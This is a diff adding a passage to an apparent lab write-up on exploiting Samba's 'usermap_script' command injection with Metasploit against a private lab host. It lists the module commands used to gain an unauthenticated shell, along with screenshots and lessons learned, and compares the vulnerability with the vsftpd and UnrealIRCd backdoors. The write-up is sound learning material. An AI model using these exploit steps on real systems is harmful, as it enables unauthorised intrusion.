@@ -101,3 +101,63 @@ server, not the vulnerability itself being intentional.
 | Trigger | Malicious login string (":)" in username) | Crafted string sent to IRC service |
 | Access gained | Root shell | Shell/command execution |
 | Root cause | Backdoored source code | Backdoored source code (compromised download) |
+
+
+## Exploit 3: Samba "usermap_script" Command Injection (Port 139/445)
+
+## Vulnerability
+Older Samba versions (3.X) with the "username map script" feature enabled allowed
+an attacker to inject shell commands directly into the username field during
+authentication. The server executed these commands without proper validation,
+resulting in unauthenticated remote command execution.
+
+## Steps Taken
+1. Searched for the exploit: `search samba usermap`
+
+<img width="1920" height="936" alt="search smb" src="https://github.com/user-attachments/assets/f9939f4b-9312-4109-9017-ad5cb5765c72" />
+
+2. Selected module: `use exploit/multi/samba/usermap_script`
+
+<img width="1920" height="936" alt="Use, Rhost , Lhost, Option" src="https://github.com/user-attachments/assets/0ed3216b-b7d0-4ca3-a2fb-428634a6e239" />
+
+3. Set target: `set RHOSTS 192.168.100.150`
+
+<img width="1920" height="936" alt="Use, Rhost , Lhost, Option" src="https://github.com/user-attachments/assets/3a152612-75ef-4bf6-9491-a79255cfb66d" />
+
+4. Set local host: `set LHOST [my Kali IP]`
+
+<img width="1920" height="936" alt="Use, Rhost , Lhost, Option" src="https://github.com/user-attachments/assets/e5cde12e-10ae-4bf9-9339-ee82583dded7" />
+
+5. Verified settings: `show options`
+
+<img width="1920" height="675" alt="Option SMB" src="https://github.com/user-attachments/assets/03d86507-1836-4aa3-bea9-4e9063cf2110" />
+
+
+6. Ran the exploit: `run`
+
+<img width="1920" height="260" alt="Run SMB 1" src="https://github.com/user-attachments/assets/2fe25ec2-d9b8-444a-9f1c-f61d36ea593c" />
+
+## Result
+Successfully exploited the vulnerability and obtained a shell on the target
+machine without authentication.
+
+Confirmed access with:
+
+<img width="1920" height="260" alt="Run SMB 1" src="https://github.com/user-attachments/assets/32bad78e-0d42-41cf-8f5c-4fb2048c12f9" />
+
+
+## What I Learned
+Unlike the previous two exploits (which relied on intentionally backdoored
+software), this vulnerability is a genuine input validation flaw — the server
+trusted user-supplied input (the username field) and passed it to a shell
+without sanitizing it. This is a classic example of a command injection
+vulnerability, a category that shows up constantly in real-world web and
+network applications, not just this one legacy service.
+
+## Comparison Across All Three Exploits
+| | vsftpd 2.3.4 | UnrealIRCd 3.2.8.1 | Samba usermap_script |
+|---|---|---|---|
+| Root cause | Backdoored source code | Backdoored source code | Input validation flaw (command injection) |
+| Trigger | Malicious login string | Crafted IRC string | Malicious username field |
+| Category | Supply chain backdoor | Supply chain backdoor | Command injection |
+| Access gained | Root shell | Shell/command execution | Shell (unauthenticated) |
